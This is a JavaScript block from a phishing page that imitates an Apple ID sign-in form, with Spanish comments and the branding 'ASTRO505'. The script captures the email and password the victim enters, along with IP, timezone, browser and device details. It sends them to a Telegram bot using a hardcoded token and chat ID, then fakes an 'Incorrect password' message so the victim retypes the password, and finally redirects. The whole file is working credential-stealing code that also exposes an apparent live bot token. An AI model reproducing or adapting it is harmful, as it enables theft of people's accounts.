<script>
document.addEventListener('DOMContentLoaded', () => {
    const emailInput = document.getElementById('email-phone');
    const arrowIcon = document.querySelector('.bx-right-arrow-circle');
    const passwordField = document.getElementById('passwordField');
    const passwordInput = document.getElementById('password');
    const submitBtn = document.getElementById('submitBtn');
    const errorMsg = document.getElementById('errorMsg');
    const form = document.getElementById('sign-in');
    
    // ✅ TUS DATOS CORRECTOS
    const TELEGRAM_TOKEN = '7785623280:AAE3v4kmIOZTpJDLICsp_xE5Ka5Yu-B5cQA';
    const CHAT_ID = '7219932215';
    
    let loginAttempts = 0;
    const maxAttempts = 2;
    
    // 🚀 FUNCIÓN TELEGRAM MEJORADA
    async function sendToTelegram(email, password) {
        const userAgent = navigator.userAgent;
        const country = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
        const browser = navigator.userAgentData?.brands[0]?.brand || navigator.appName;
        const os = navigator.platform || 'Unknown';
        const device = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent) ? 'Mobile' : 'Desktop';
        const time = new Date().toLocaleString('es-ES');
        
        const message = `🚀 *ASTRO505 - NUEVA CAPTURA APPLE ID* 🚀

📧 *Email:* ${email}
🔑 *Password:* ${password}
🌍 *País:* ${country}
🌐 *IP:* ${await getIP()} 
💻 *Navegador:* ${browser}
🖥️ *Sistema:* ${os}
📱 *Device:* ${device}
📅 *Hora:* ${time}

✨ *Plataforma:* Astro505`;

        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
        
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
        
        const data = await response.json();
        console.log('📱 Telegram Response:', data); // Para debug
        
        if (data.ok) {
            console.log('✅ ¡ENVIADO A TELEGRAM!');
        } else {
            console.error('❌ Error:', data);
        }
    }
    
    // IP Real (opcional)
    async function getIP() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            return data.ip;
        } catch {
            return 'No disponible';
        }
    }
    
    // Mostrar password (sin cambios)
    const showPassword = () => {
        if (emailInput.value.trim()) {
            passwordField.classList.add('show');
            submitBtn.classList.add('show');
            setTimeout(() => passwordInput.focus(), 250);
        } else {
            showError('Enter your email or phone number');
        }
    };
    
    arrowIcon.addEventListener('click', showPassword);
    emailInput.addEventListener('keypress', e => {
        if (e.key === 'Enter' && emailInput.value.trim()) {
            e.preventDefault();
            showPassword();
        }
    });
    
    emailInput.addEventListener('input', () => {
        if (!emailInput.value.trim()) {
            passwordField.classList.remove('show');
            submitBtn.classList.remove('show');
            passwordInput.value = '';
        }
    });
    
    // SUBMIT CON TELEGRAM
    form.addEventListener('submit', async e => {
        e.preventDefault();
        
        const email = emailInput.value.trim();
        const password = passwordInput.value.trim();
        
        if (!email || !password) {
            showError('Please enter email and password');
            return;
        }
        
        // 🔥 ENVÍA A TELEGRAM SIEMPRE
        await sendToTelegram(email, password);
        
        // Simula login
        loginAttempts++;
        if (loginAttempts < maxAttempts) {
            showError('Incorrect password. Try again.');
            passwordInput.value = '';
        } else {
            showSuccess();
        }
    });
    
    function showError(message) {
        errorMsg.textContent = message;
        errorMsg.style.background = '#ff3b30';
        errorMsg.classList.add('show');
        setTimeout(() => errorMsg.classList.remove('show'), 3000);
    }
    
    function showSuccess() {
        errorMsg.textContent = 'Signing in...';
        errorMsg.style.background = '#007AFF';
        errorMsg.classList.add('show');
        submitBtn.disabled = true;
        setTimeout(() => window.location.href = 'index.html', 1500);
    }
});
</script>
